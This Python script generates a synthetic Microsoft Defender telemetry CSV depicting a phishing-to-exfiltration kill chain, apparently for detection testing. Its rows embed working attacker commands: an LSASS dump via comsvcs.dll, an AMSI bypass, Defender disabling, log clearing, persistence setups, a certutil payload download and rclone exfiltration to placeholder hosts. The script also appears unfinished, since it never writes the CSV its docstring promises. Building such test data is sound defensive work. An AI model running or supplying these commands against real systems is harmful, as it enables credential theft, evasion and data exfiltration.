#!/usr/bin/env python3
"""
Multi-stage attack scenario generator — Microsoft Defender Advanced Hunting CSV.

Produces sample-defender-multistage.csv: a fabricated kill chain covering
initial access, discovery, credential access, defense evasion, persistence,
lateral movement, second-host activity, exfil, and cleanup.

All identifiers (hosts, users, IPs, hashes, URLs) are obviously fabricated.
IPs use RFC 5737 documentation ranges. Hashes are repeating-pattern hex.

Run:
  python3 gen-multistage.py > sample-defender-multistage.csv
"""
import csv
import sys
from datetime import datetime, timedelta

# ── Identities ────────────────────────────────────────────────────────────────
HOSTS = {
    'WS-MARKETING-08': '10.50.5.42',   # patient zero
    'WS-FINANCE-04':   '10.50.5.18',   # RDP target
    'SRV-FILES-01':    '10.99.1.10',   # file server (WinRM/SMB target)
    'DC-CORP-01':      '10.99.1.5',    # domain controller
    'WS-LEGAL-12':     '10.50.5.27',   # second phish drop
}
C2_PRIMARY = '198.51.100.42'   # RFC 5737 docs
C2_PAYLOAD = '203.0.113.55'    # RFC 5737 docs
EXFIL_DEST = '192.0.2.99'      # RFC 5737 docs

# ── Known binary hashes — repeating-pattern hex so each binary is traceable ──
H = {
    'svchost.exe':    'A1B2C3D4E5F6' * 5 + 'A1B2',
    'explorer.exe':   'B0B1B2B3B4B5' * 5 + 'B0B1',
    'OUTLOOK.EXE':    '001122334455' * 5 + '0011',
    'WINWORD.EXE':    'B7C8D9E0F1A2' * 5 + 'B7C8',
    'powershell.exe': 'C9D0E1F2A3B4' * 5 + 'C9D0',
    'cmd.exe':        'E3F4A5B6C7D8' * 5 + 'E3F4',
    'whoami.exe':     '11AA22BB33CC' * 5 + '11AA',
    'nltest.exe':     'F5A6B7C8D9E0' * 5 + 'F5A6',
    'net.exe':        'A7B8C9D0E1F2' * 5 + 'A7B8',
    'systeminfo.exe': '22BB33CC44DD' * 5 + '22BB',
    'ipconfig.exe':   '33CC44DD55EE' * 5 + '33CC',
    'rundll32.exe':   'B9C0D1E2F3A4' * 5 + 'B9C0',
    'schtasks.exe':   'D3E4F5A6B7C8' * 5 + 'D3E4',
    'reg.exe':        '44DD55EE66FF' * 5 + '44DD',
    'wmic.exe':       '55EE66FF77AA' * 5 + '55EE',
    'sc.exe':         '66FF77AA88BB' * 5 + '66FF',
    'wevtutil.exe':   '77AA88BB99CC' * 5 + '77AA',
    'certutil.exe':   'E5F6A7B8C9D0' * 5 + 'E5F6',
    '7z.exe':         '88BB99CC00DD' * 5 + '88BB',
    'vaultcmd.exe':   '99CC00DD11EE' * 5 + '99CC',
    'setspn.exe':     '00DD11EE22FF' * 5 + '00DD',
    'mstsc.exe':      '11EE22FF33AA' * 5 + '11EE',
    'arp.exe':        '22FF33AA44BB' * 5 + '22FF',
    'route.exe':      '33AA44BB55CC' * 5 + '33AA',
    'dsquery.exe':    '44BB55CC66DD' * 5 + '44BB',
    'hostname.exe':   '55CC66DD77EE' * 5 + '55CC',
    'wmiprvse.exe':   '66DD77EE88FF' * 5 + '66DD',
    'mmc.exe':        '77EE88FF99AA' * 5 + '77EE',
    'csc.exe':        '88FF99AA00BB' * 5 + '88FF',
    'update.exe':     'F7A8B9C0D1E2' * 5 + 'F7A8',  # stage 2 payload
    'rclone.exe':     '99AA00BB11CC' * 5 + '99AA',  # exfil tool
    's2.ps1':         'D1E2F3A4B5C6' * 5 + 'D1E2',
    'out.bin':        'C1D2E3F4A5B6' * 5 + 'C1D2',
}

# Common encoded PowerShell beacon — fake b64 that decodes to nothing real.
ENC_PS = ('-nop -w hidden -enc '
          'SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAv'
          'ADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA')

# Mutable timestamp + pid + report id
class Ctx:
    def __init__(self, start):
        self.now = start
        self.pid_counter = 4000
        self.rpt = 1000

    def t(self, *, sec=0, min=0):
        self.now += timedelta(minutes=min, seconds=sec)
        return self.now.strftime('%Y-%m-%dT%H:%M:%SZ')

    def pid(self):
        self.pid_counter += 7
        return self.pid_counter

    def r(self):
        self.rpt += 1
        return self.rpt


# Row builder — fills the 17-column Defender Advanced Hunting schema.
def row(ts, host, action, fn, fp, cmd, sha, acct, ifn, icmd, ipid, iacct, ppid,
        rip='', rurl='', rport='', rpt=0):
    return [ts, host, action, fn, fp, cmd, sha, acct, ifn, icmd, ipid, iacct, ppid,
            rip, rurl, rport, str(rpt)]


def build_rows():
    rows = []
    ctx = Ctx(datetime(2026, 5, 20, 8, 30, 0))

    # ── Stage 0: baseline activity (give some context) ────────────────────────
    rows.append(row(ctx.t(sec=15), 'WS-MARKETING-08', 'ProcessCreated',
                    'svchost.exe', r'C:\Windows\System32',
                    'svchost.exe -k netsvcs', H['svchost.exe'], 'SYSTEM',
                    'services.exe', r'C:\Windows\System32\services.exe', 612,
                    'SYSTEM', ctx.pid(), rpt=ctx.r()))
    rows.append(row(ctx.t(min=3), 'WS-MARKETING-08', 'ProcessCreated',
                    'explorer.exe', r'C:\Windows',
                    'explorer.exe', H['explorer.exe'], 'jbecker',
                    'userinit.exe', r'C:\Windows\System32\userinit.exe', 894,
                    'jbecker', ctx.pid(), rpt=ctx.r()))
    rows.append(row(ctx.t(min=4), 'WS-FINANCE-04', 'ProcessCreated',
                    'explorer.exe', r'C:\Windows',
                    'explorer.exe', H['explorer.exe'], 'jdoe',
                    'userinit.exe', r'C:\Windows\System32\userinit.exe', 901,
                    'jdoe', ctx.pid(), rpt=ctx.r()))
    rows.append(row(ctx.t(min=1), 'SRV-FILES-01', 'ProcessCreated',
                    'svchost.exe', r'C:\Windows\System32',
                    'svchost.exe -k LocalServiceNetworkRestricted', H['svchost.exe'],
                    'SYSTEM', 'services.exe',
                    r'C:\Windows\System32\services.exe', 612, 'SYSTEM',
                    ctx.pid(), rpt=ctx.r()))
    rows.append(row(ctx.t(min=2), 'WS-MARKETING-08', 'ProcessCreated',
                    'OUTLOOK.EXE', r'C:\Program Files\Microsoft Office\root\Office16',
                    'OUTLOOK.EXE /recycle', H['OUTLOOK.EXE'], 'jbecker',
                    'explorer.exe', r'C:\Windows\explorer.exe', 3412, 'jbecker',
                    ctx.pid(), rpt=ctx.r()))

    # ── Stage 1: initial access — phishing macro → encoded PowerShell ────────
    outlook_pid = rows[-1][12]
    winword_pid = ctx.pid()
    rows.append(row(ctx.t(min=25), 'WS-MARKETING-08', 'ProcessCreated',
                    'WINWORD.EXE',
                    r'C:\Program Files\Microsoft Office\root\Office16',
                    'WINWORD.EXE /n "C:\\Users\\jbecker\\Downloads\\Q2_Marketing_Plan.docm"',
                    H['WINWORD.EXE'], 'jbecker', 'OUTLOOK.EXE',
                    'OUTLOOK.EXE /recycle', outlook_pid, 'jbecker',
                    winword_pid, rpt=ctx.r()))

    ps_pid = ctx.pid()
    rows.append(row(ctx.t(sec=42), 'WS-MARKETING-08', 'ProcessCreated',
                    'powershell.exe',
                    r'C:\Windows\System32\WindowsPowerShell\v1.0',
                    f'powershell.exe {ENC_PS}', H['powershell.exe'], 'jbecker',
                    'WINWORD.EXE',
                    'WINWORD.EXE /n "C:\\Users\\jbecker\\Downloads\\Q2_Marketing_Plan.docm"',
                    winword_pid, 'jbecker', ps_pid, rpt=ctx.r()))

    rows.append(row(ctx.t(sec=12), 'WS-MARKETING-08', 'NetworkConnectionEvents',
                    'powershell.exe',
                    r'C:\Windows\System32\WindowsPowerShell\v1.0',
                    f'powershell.exe {ENC_PS}', H['powershell.exe'], 'jbecker',
                    'powershell.exe', f'powershell.exe {ENC_PS}',
                    ps_pid, 'jbecker', ps_pid,
                    rip=C2_PRIMARY, rurl='evil-staging.example', rport='443',
                    rpt=ctx.r()))

    rows.append(row(ctx.t(sec=18), 'WS-MARKETING-08', 'FileCreated',
                    's2.ps1', r'C:\Users\jbecker\AppData\Local\Temp',
                    f'powershell.exe {ENC_PS}', H['s2.ps1'], 'jbecker',
                    'powershell.exe', f'powershell.exe {ENC_PS}',
                    ps_pid, 'jbecker', ps_pid, rpt=ctx.r()))

    # ── Stage 2: discovery (whoami, net, nltest, systeminfo, ipconfig) ───────
    discovery = [
        ('cmd.exe',        'cmd.exe /c whoami /all',                H['cmd.exe']),
        ('whoami.exe',     'whoami.exe /all',                       H['whoami.exe']),
        ('whoami.exe',     'whoami.exe /priv',                      H['whoami.exe']),
        ('whoami.exe',     'whoami.exe /groups',                    H['whoami.exe']),
        ('hostname.exe',   'hostname.exe',                          H['hostname.exe']),
        ('ipconfig.exe',   'ipconfig.exe /all',                     H['ipconfig.exe']),
        ('nltest.exe',     'nltest.exe /domain_trusts',             H['nltest.exe']),
        ('nltest.exe',     'nltest.exe /dclist:corp.local',         H['nltest.exe']),
        ('net.exe',        'net.exe user /domain',                  H['net.exe']),
        ('net.exe',        'net.exe group "Domain Admins" /domain', H['net.exe']),
        ('net.exe',        'net.exe group "Enterprise Admins" /domain', H['net.exe']),
        ('net.exe',        'net.exe view /domain',                  H['net.exe']),
        ('systeminfo.exe', 'systeminfo.exe',                        H['systeminfo.exe']),
        ('arp.exe',        'arp.exe -a',                            H['arp.exe']),
        ('route.exe',      'route.exe print',                       H['route.exe']),
    ]
    for fn, cmd, sha in discovery:
        rows.append(row(ctx.t(sec=8), 'WS-MARKETING-08', 'ProcessCreated',
                        fn, r'C:\Windows\System32', cmd, sha, 'jbecker',
                        'powershell.exe', f'powershell.exe {ENC_PS}',
                        ps_pid, 'jbecker', ctx.pid(), rpt=ctx.r()))

    # Beacon callback during discovery
    rows.append(row(ctx.t(sec=20), 'WS-MARKETING-08', 'NetworkConnectionEvents',
                    'powershell.exe',
                    r'C:\Windows\System32\WindowsPowerShell\v1.0',
                    f'powershell.exe {ENC_PS}', H['powershell.exe'], 'jbecker',
                    'powershell.exe', f'powershell.exe {ENC_PS}',
                    ps_pid, 'jbecker', ps_pid,
                    rip=C2_PRIMARY, rurl='evil-staging.example', rport='443',
                    rpt=ctx.r()))

    # ── Stage 3: credential access ────────────────────────────────────────────
    rows.append(row(ctx.t(min=2), 'WS-MARKETING-08', 'ProcessCreated',
                    'rundll32.exe', r'C:\Windows\System32',
                    'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 716 '
                    'C:\\Users\\jbecker\\AppData\\Local\\Temp\\out.bin full',
                    H['rundll32.exe'], 'jbecker', 'powershell.exe',
                    f'powershell.exe {ENC_PS}', ps_pid, 'jbecker',
                    ctx.pid(), rpt=ctx.r()))
    rows.append(row(ctx.t(sec=8), 'WS-MARKETING-08', 'FileCreated',
                    'out.bin', r'C:\Users\jbecker\AppData\Local\Temp',
                    'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 716 '
                    'C:\\Users\\jbecker\\AppData\\Local\\Temp\\out.bin full',
                    H['out.bin'], 'jbecker', 'rundll32.exe',
                    'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 716 '
                    'C:\\Users\\jbecker\\AppData\\Local\\Temp\\out.bin full',
                    ctx.pid_counter, 'jbecker', ctx.pid_counter,
                    rpt=ctx.r()))
    rows.append(row(ctx.t(sec=22), 'WS-MARKETING-08', 'ProcessCreated',
                    'vaultcmd.exe', r'C:\Windows\System32',
                    'vaultcmd.exe /listcreds:"Windows Credentials" /all',
                    H['vaultcmd.exe'], 'jbecker', 'powershell.exe',
                    f'powershell.exe {ENC_PS}', ps_pid, 'jbecker',
                    ctx.pid(), rpt=ctx.r()))
    rows.append(row(ctx.t(sec=18), 'WS-MARKETING-08', 'ProcessCreated',
                    'setspn.exe', r'C:\Windows\System32',
                    'setspn.exe -T corp.local -Q */*',
                    H['setspn.exe'], 'jbecker', 'powershell.exe',
                    f'powershell.exe {ENC_PS}', ps_pid, 'jbecker',
                    ctx.pid(), rpt=ctx.r()))
    # LDAP query traffic to DC for kerberoasting recon
    rows.append(row(ctx.t(sec=5), 'WS-MARKETING-08', 'NetworkConnectionEvents',
                    'setspn.exe', r'C:\Windows\System32',
                    'setspn.exe -T corp.local -Q */*', H['setspn.exe'],
                    'jbecker', 'setspn.exe', 'setspn.exe -T corp.local -Q */*',
                    ctx.pid_counter, 'jbecker', ctx.pid_counter,
                    rip=HOSTS['DC-CORP-01'], rurl='dc-corp-01.corp.local',
                    rport='389', rpt=ctx.r()))
    # Kerberos service ticket request (TGS for SQL svc account) — kerberoasting
    rows.append(row(ctx.t(sec=14), 'WS-MARKETING-08', 'NetworkConnectionEvents',
                    'lsass.exe', r'C:\Windows\System32',
                    'lsass.exe', H['svchost.exe'], 'SYSTEM',
                    'lsass.exe', 'lsass.exe', 716, 'SYSTEM', 716,
                    rip=HOSTS['DC-CORP-01'], rurl='dc-corp-01.corp.local',
                    rport='88', rpt=ctx.r()))

    # ── Stage 4: defense evasion ─────────────────────────────────────────────
    rows.append(row(ctx.t(min=1), 'WS-MARKETING-08', 'ProcessCreated',
                    'powershell.exe',
                    r'C:\Windows\System32\WindowsPowerShell\v1.0',
                    'powershell.exe -enc '
                    '$Ref=[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils");'
                    '$Ref.GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)',
                    H['powershell.exe'], 'jbecker', 'powershell.exe',
                    f'powershell.exe {ENC_PS}', ps_pid, 'jbecker',
                    ctx.pid(), rpt=ctx.r()))
    rows.append(row(ctx.t(sec=10), 'WS-MARKETING-08', 'ProcessCreated',
                    'wevtutil.exe', r'C:\Windows\System32',
                    'wevtutil.exe cl Security', H['wevtutil.exe'], 'jbecker',
                    'powershell.exe', f'powershell.exe {ENC_PS}',
                    ps_pid, 'jbecker', ctx.pid(), rpt=ctx.r()))
    rows.append(row(ctx.t(sec=8), 'WS-MARKETING-08', 'ProcessCreated',
                    'reg.exe', r'C:\Windows\System32',
                    'reg.exe add HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection '
                    '/v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f',
                    H['reg.exe'], 'jbecker', 'powershell.exe',
                    f'powershell.exe {ENC_PS}', ps_pid, 'jbecker',
                    ctx.pid(), rpt=ctx.r()))

    # ── Stage 5: persistence — multiple mechanisms ───────────────────────────
    rows.append(row(ctx.t(min=2), 'WS-MARKETING-08', 'ProcessCreated',
                    'schtasks.exe', r'C:\Windows\System32',
                    'schtasks.exe /create /tn "WindowsUpdateCheck" '
                    '/tr "C:\\Users\\jbecker\\AppData\\Local\\Temp\\s2.ps1" '
                    '/sc onlogon /ru SYSTEM /f', H['schtasks.exe'], 'jbecker',
                    'powershell.exe', f'powershell.exe {ENC_PS}',
                    ps_pid, 'jbecker', ctx.pid(), rpt=ctx.r()))
    rows.append(row(ctx.t(sec=14), 'WS-MARKETING-08', 'ProcessCreated',
                    'reg.exe', r'C:\Windows\System32',
                    'reg.exe add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run '
                    '/v "MicrosoftEdgeUpdater" '
                    '/d "C:\\ProgramData\\update.exe /q" /f',
                    H['reg.exe'], 'jbecker', 'powershell.exe',
                    f'powershell.exe {ENC_PS}', ps_pid, 'jbecker',
                    ctx.pid(), rpt=ctx.r()))
    rows.append(row(ctx.t(sec=10), 'WS-MARKETING-08', 'ProcessCreated',
                    'reg.exe', r'C:\Windows\System32',
                    'reg.exe add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce '
                    '/v "Bootstrap" /d "powershell.exe -f '
                    'C:\\Users\\jbecker\\AppData\\Local\\Temp\\s2.ps1" /f',
                    H['reg.exe'], 'jbecker', 'powershell.exe',
                    f'powershell.exe {ENC_PS}', ps_pid, 'jbecker',
                    ctx.pid(), rpt=ctx.r()))
    rows.append(row(ctx.t(sec=18), 'WS-MARKETING-08', 'ProcessCreated',
                    'wmic.exe', r'C:\Windows\System32\wbem',
                    'wmic.exe /namespace:\\\\root\\subscription PATH __EventFilter '
                    'CREATE Name="MaintFilter", EventNameSpace="root\\cimv2", '
                    'QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent '
                    'WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"',
                    H['wmic.exe'], 'jbecker', 'powershell.exe',
                    f'powershell.exe {ENC_PS}', ps_pid, 'jbecker',
                    ctx.pid(), rpt=ctx.r()))
    rows.append(row(ctx.t(sec=22), 'WS-MARKETING-08', 'ProcessCreated',
                    'sc.exe', r'C:\Windows\System32',
                    'sc.exe create NetSvcMaint binPath= "C:\\ProgramData\\update.exe /svc" '
                    'start= auto DisplayName= "Network Service Maintenance"',
                    H['sc.exe'], 'jbecker', 'powershell.exe',
                    f'powershell.exe {ENC_PS}', ps_pid, 'jbecker',
                    ctx.pid(), rpt=ctx.r()))
    # Drop the persistence binary
    rows.append(row(ctx.t(sec=30), 'WS-MARKETING-08', 'FileCreated',
                    'update.exe', r'C:\ProgramData',
                    f'powershell.exe {ENC_PS}', H['update.exe'], 'jbecker',
                    'powershell.exe', f'powershell.exe {ENC_PS}',
                    ps_pid, 'jbecker', ps_pid, rpt=ctx.r()))

    # ── Stage 6: lateral movement — WinRM, SMB, RDP ──────────────────────────
    rows.append(row(ctx.t(min=2), 'WS-MARKETING-08', 'ProcessCreated',
                    'net.exe', r'C:\Windows\System32',
                    'net.exe use \\\\SRV-FILES-01\\C$ /user:CORP\\jbecker',
                    H['net.exe'], 'jbecker', 'powershell.exe',
                    f'powershell.exe {ENC_PS}', ps_pid, 'jbecker',
                    ctx.pid(), rpt=ctx.r()))
    rows.append(row(ctx.t(sec=6), 'WS-MARKETING-08', 'NetworkConnectionEvents',
                    'net.exe', r'C:\Windows\System32',
                    'net.exe use \\\\SRV-FILES-01\\C$ /user:CORP\\jbecker',
                    H['net.exe'], 'jbecker', 'net.exe',
                    'net.exe use \\\\SRV-FILES-01\\C$ /user:CORP\\jbecker',
                    ctx.pid_counter, 'jbecker', ctx.pid_counter,
                    rip=HOSTS['SRV-FILES-01'], rurl='srv-files-01.corp.local',
                    rport='445', rpt=ctx.r()))
    rows.append(row(ctx.t(sec=12), 'WS-MARKETING-08', 'ProcessCreated',
                    'powershell.exe',
                    r'C:\Windows\System32\WindowsPowerShell\v1.0',
                    'powershell.exe Invoke-Command -ComputerName SRV-FILES-01 '
                    '-ScriptBlock {whoami; hostname; ipconfig /all}',
                    H['powershell.exe'], 'jbecker', 'powershell.exe',
                    f'powershell.exe {ENC_PS}', ps_pid, 'jbecker',
                    ctx.pid(), rpt=ctx.r()))
    rows.append(row(ctx.t(sec=4), 'WS-MARKETING-08', 'NetworkConnectionEvents',
                    'powershell.exe',
                    r'C:\Windows\System32\WindowsPowerShell\v1.0',
                    'powershell.exe Invoke-Command -ComputerName SRV-FILES-01',
                    H['powershell.exe'], 'jbecker', 'powershell.exe',
                    f'powershell.exe {ENC_PS}', ps_pid, 'jbecker',
                    ctx.pid_counter,
                    rip=HOSTS['SRV-FILES-01'], rurl='srv-files-01.corp.local',
                    rport='5985', rpt=ctx.r()))
    rows.append(row(ctx.t(sec=15), 'WS-MARKETING-08', 'ProcessCreated',
                    'mstsc.exe', r'C:\Windows\System32',
                    'mstsc.exe /v:WS-FINANCE-04', H['mstsc.exe'], 'jbecker',
                    'powershell.exe', f'powershell.exe {ENC_PS}',
                    ps_pid, 'jbecker', ctx.pid(), rpt=ctx.r()))
    rows.append(row(ctx.t(sec=8), 'WS-MARKETING-08', 'NetworkConnectionEvents',
                    'mstsc.exe', r'C:\Windows\System32',
                    'mstsc.exe /v:WS-FINANCE-04', H['mstsc.exe'], 'jbecker',
                    'mstsc.exe', 'mstsc.exe /v:WS-FINANCE-04',
                    ctx.pid_counter, 'jbecker', ctx.pid_counter,
                    rip=HOSTS['WS-FINANCE-04'], rurl='ws-finance-04.corp.local',
                    rport='3389', rpt=ctx.r()))
    rows.append(row(ctx.t(sec=10), 'WS-MARKETING-08', 'ProcessCreated',
                    'sc.exe', r'C:\Windows\System32',
                    'sc.exe \\\\SRV-FILES-01 create RemoteUpdate binPath= '
                    '"C:\\Windows\\Temp\\update.exe" start= auto',
                    H['sc.exe'], 'jbecker', 'powershell.exe',
                    f'powershell.exe {ENC_PS}', ps_pid, 'jbecker',
                    ctx.pid(), rpt=ctx.r()))

    # Multiple beacon callbacks during lateral phase (for beacon detection)
    for i in range(4):
        rows.append(row(ctx.t(min=3), 'WS-MARKETING-08', 'NetworkConnectionEvents',
                        'powershell.exe',
                        r'C:\Windows\System32\WindowsPowerShell\v1.0',
                        f'powershell.exe {ENC_PS}', H['powershell.exe'],
                        'jbecker', 'powershell.exe',
                        f'powershell.exe {ENC_PS}', ps_pid, 'jbecker', ps_pid,
                        rip=C2_PRIMARY, rurl='evil-staging.example',
                        rport='443', rpt=ctx.r()))

    # ── Stage 7: second-host (SRV-FILES-01) activity ──────────────────────────
    srv_ps_pid = ctx.pid()
    rows.append(row(ctx.t(min=1), 'SRV-FILES-01', 'ProcessCreated',
                    'powershell.exe',
                    r'C:\Windows\System32\WindowsPowerShell\v1.0',
                    f'powershell.exe {ENC_PS}', H['powershell.exe'],
                    'svc-backup', 'wsmprovhost.exe',
                    'wsmprovhost.exe -Embedding', 5512, 'svc-backup',
                    srv_ps_pid, rpt=ctx.r()))
    rows.append(row(ctx.t(sec=12), 'SRV-FILES-01', 'NetworkConnectionEvents',
                    'powershell.exe',
                    r'C:\Windows\System32\WindowsPowerShell\v1.0',
                    f'powershell.exe {ENC_PS}', H['powershell.exe'],
                    'svc-backup', 'powershell.exe', f'powershell.exe {ENC_PS}',
                    srv_ps_pid, 'svc-backup', srv_ps_pid,
                    rip=C2_PRIMARY, rurl='evil-staging.example',
                    rport='443', rpt=ctx.r()))
    srv_discovery = [
        ('whoami.exe',     'whoami.exe /all'),
        ('hostname.exe',   'hostname.exe'),
        ('net.exe',        'net.exe localgroup administrators'),
        ('nltest.exe',     'nltest.exe /dclist:corp.local'),
        ('dsquery.exe',    'dsquery.exe user -limit 10000'),
    ]
    for fn, cmd in srv_discovery:
        rows.append(row(ctx.t(sec=10), 'SRV-FILES-01', 'ProcessCreated',
                        fn, r'C:\Windows\System32', cmd, H.get(fn, H['cmd.exe']),
                        'svc-backup', 'powershell.exe',
                        f'powershell.exe {ENC_PS}', srv_ps_pid, 'svc-backup',
                        ctx.pid(), rpt=ctx.r()))
    rows.append(row(ctx.t(sec=22), 'SRV-FILES-01', 'ProcessCreated',
                    'rundll32.exe', r'C:\Windows\System32',
                    'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 712 '
                    'C:\\Windows\\Temp\\srv-out.bin full',
                    H['rundll32.exe'], 'svc-backup', 'powershell.exe',
                    f'powershell.exe {ENC_PS}', srv_ps_pid, 'svc-backup',
                    ctx.pid(), rpt=ctx.r()))
    rows.append(row(ctx.t(sec=8), 'SRV-FILES-01', 'FileCreated',
                    'srv-out.bin', r'C:\Windows\Temp',
                    'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 712 '
                    'C:\\Windows\\Temp\\srv-out.bin full',
                    H['out.bin'], 'svc-backup', 'rundll32.exe',
                    'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump',
                    ctx.pid_counter, 'svc-backup', ctx.pid_counter,
                    rpt=ctx.r()))

    # ── Stage 8: data staging + exfil from SRV-FILES-01 ──────────────────────
    rows.append(row(ctx.t(min=2), 'SRV-FILES-01', 'ProcessCreated',
                    'certutil.exe', r'C:\Windows\System32',
                    'certutil.exe -urlcache -split -f '
                    f'https://{C2_PAYLOAD}/tools/rclone.exe C:\\Windows\\Temp\\rclone.exe',
                    H['certutil.exe'], 'svc-backup', 'powershell.exe',
                    f'powershell.exe {ENC_PS}', srv_ps_pid, 'svc-backup',
                    ctx.pid(), rpt=ctx.r()))
    rows.append(row(ctx.t(sec=8), 'SRV-FILES-01', 'NetworkConnectionEvents',
                    'certutil.exe', r'C:\Windows\System32',
                    f'certutil.exe -urlcache -split -f https://{C2_PAYLOAD}/tools/rclone.exe',
                    H['certutil.exe'], 'svc-backup', 'certutil.exe',
                    f'certutil.exe -urlcache -split -f https://{C2_PAYLOAD}/tools/rclone.exe',
                    ctx.pid_counter, 'svc-backup', ctx.pid_counter,
                    rip=C2_PAYLOAD, rurl=f'https://{C2_PAYLOAD}/tools/rclone.exe',
                    rport='443', rpt=ctx.r()))
    rows.append(row(ctx.t(sec=14), 'SRV-FILES-01', 'FileCreated',
                    'rclone.exe', r'C:\Windows\Temp',
                    'certutil.exe -urlcache', H['rclone.exe'],
                    'svc-backup', 'certutil.exe',
                    'certutil.exe -urlcache -split -f',
                    ctx.pid_counter, 'svc-backup', ctx.pid_counter,
                    rpt=ctx.r()))
    rows.append(row(ctx.t(sec=18), 'SRV-FILES-01', 'ProcessCreated',
                    '7z.exe', r'C:\Windows\Temp',
                    '7z.exe a -p"Pa$$w0rd!" -mhe=on C:\\Windows\\Temp\\stg.7z '
                    'C:\\Users\\jbecker\\Documents\\* C:\\Shares\\Finance\\*',
                    H['7z.exe'], 'svc-backup', 'powershell.exe',
                    f'powershell.exe {ENC_PS}', srv_ps_pid, 'svc-backup',
                    ctx.pid(), rpt=ctx.r()))
    rows.append(row(ctx.t(min=3), 'SRV-FILES-01', 'FileCreated',
                    'stg.7z', r'C:\Windows\Temp',
                    '7z.exe a -p"Pa$$w0rd!" -mhe=on C:\\Windows\\Temp\\stg.7z',
                    H['7z.exe'], 'svc-backup', '7z.exe',
                    '7z.exe a -p"Pa$$w0rd!" -mhe=on',
                    ctx.pid_counter, 'svc-backup', ctx.pid_counter,
                    rpt=ctx.r()))
    rows.append(row(ctx.t(sec=20), 'SRV-FILES-01', 'ProcessCreated',
                    'rclone.exe', r'C:\Windows\Temp',
                    'rclone.exe copy C:\\Windows\\Temp\\stg.7z '
                    f'remote:bucket --http-url=http://{EXFIL_DEST}/upload',
                    H['rclone.exe'], 'svc-backup', 'powershell.exe',
                    f'powershell.exe {ENC_PS}', srv_ps_pid, 'svc-backup',
                    ctx.pid(), rpt=ctx.r()))
    # Multiple exfil chunks
    for _ in range(3):
        rows.append(row(ctx.t(sec=30), 'SRV-FILES-01', 'NetworkConnectionEvents',
                        'rclone.exe', r'C:\Windows\Temp',
                        f'rclone.exe copy C:\\Windows\\Temp\\stg.7z remote:bucket',
                        H['rclone.exe'], 'svc-backup', 'rclone.exe',
                        'rclone.exe copy', ctx.pid_counter, 'svc-backup',
                        ctx.pid_counter,
                        rip=EXFIL_DEST, rurl=f'http://{EXFIL_DEST}/upload',
                        rport='80', rpt=ctx.r()))

    # ── Stage 9: cleanup / anti-forensics on both hosts ──────────────────────
    for host, acct, parent_pid in [('SRV-FILES-01', 'svc-backup', srv_ps_pid),
                                    ('WS-MARKETING-08', 'jbecker', ps_pid)]:
        rows.append(row(ctx.t(min=1), host, 'ProcessCreated',
                        'wevtutil.exe', r'C:\Windows\System32',
                        'wevtutil.exe cl Application', H['wevtutil.exe'], acct,
                        'powershell.exe', f'powershell.exe {ENC_PS}',
                        parent_pid, acct, ctx.pid(), rpt=ctx.r()))
        rows.append(row(ctx.t(sec=6), host, 'ProcessCreated',
                        'wevtutil.exe', r'C:\Windows\System32',
                        'wevtutil.exe cl System', H['wevtutil.exe'], acct,
                        'powershell.exe', f'powershell.exe {ENC_PS}',
                        parent_pid, acct, ctx.pid(), rpt=ctx.r()))
        rows.append(row(ctx.t(sec=8), host, 'ProcessCreated',
                        'cmd.exe', r'C:\Windows\System32',
                        'cmd.exe /c del /q /f C:\\Windows\\Temp\\*.7z '
                        'C:\\Windows\\Temp\\out.bin C:\\Windows\\Temp\\srv-out.bin '
                        'C:\\Users\\jbecker\\AppData\\Local\\Temp\\out.bin',
                        H['cmd.exe'], acct, 'powershell.exe',
                        f'powershell.exe {ENC_PS}', parent_pid, acct,
                        ctx.pid(), rpt=ctx.r()))

    # ── Stage 10: second phish drop on WS-LEGAL-12 (campaign continues) ──────
    ctx.now = datetime(2026, 5, 20, 11, 42, 0)
    rows.append(row(ctx.t(sec=8), 'WS-LEGAL-12', 'ProcessCreated',
                    'OUTLOOK.EXE',
                    r'C:\Program Files\Microsoft Office\root\Office16',
                    'OUTLOOK.EXE /recycle', H['OUTLOOK.EXE'], 'smith',
                    'explorer.exe', r'C:\Windows\explorer.exe', 3018,
                    'smith', ctx.pid(), rpt=ctx.r()))
    legal_outlook_pid = ctx.pid_counter
    legal_winword_pid = ctx.pid()
    rows.append(row(ctx.t(min=4), 'WS-LEGAL-12', 'ProcessCreated',
                    'WINWORD.EXE',
                    r'C:\Program Files\Microsoft Office\root\Office16',
                    'WINWORD.EXE /n "C:\\Users\\smith\\Downloads\\Contract_Review.docm"',
                    H['WINWORD.EXE'], 'smith', 'OUTLOOK.EXE',
                    'OUTLOOK.EXE /recycle', legal_outlook_pid, 'smith',
                    legal_winword_pid, rpt=ctx.r()))
    legal_ps_pid = ctx.pid()
    rows.append(row(ctx.t(sec=38), 'WS-LEGAL-12', 'ProcessCreated',
                    'powershell.exe',
                    r'C:\Windows\System32\WindowsPowerShell\v1.0',
                    f'powershell.exe {ENC_PS}', H['powershell.exe'], 'smith',
                    'WINWORD.EXE',
                    'WINWORD.EXE /n "C:\\Users\\smith\\Downloads\\Contract_Review.docm"',
                    legal_winword_pid, 'smith', legal_ps_pid, rpt=ctx.r()))
    rows.append(row(ctx.t(sec=12), 'WS-LEGAL-12', 'NetworkConnectionEvents',
                    'powershell.exe',
                    r'C:\Windows\System32\WindowsPowerShell\v1.0',
                    f'powershell.exe {ENC_PS}', H['powershell.exe'], 'smith',
                    'powershell.exe', f'powershell.exe {ENC_PS}',
                    legal_ps_pid, 'smith', legal_ps_pid,
                    rip=C2_PRIMARY, rurl='evil-staging.example', rport='443',
                    rpt=ctx.r()))
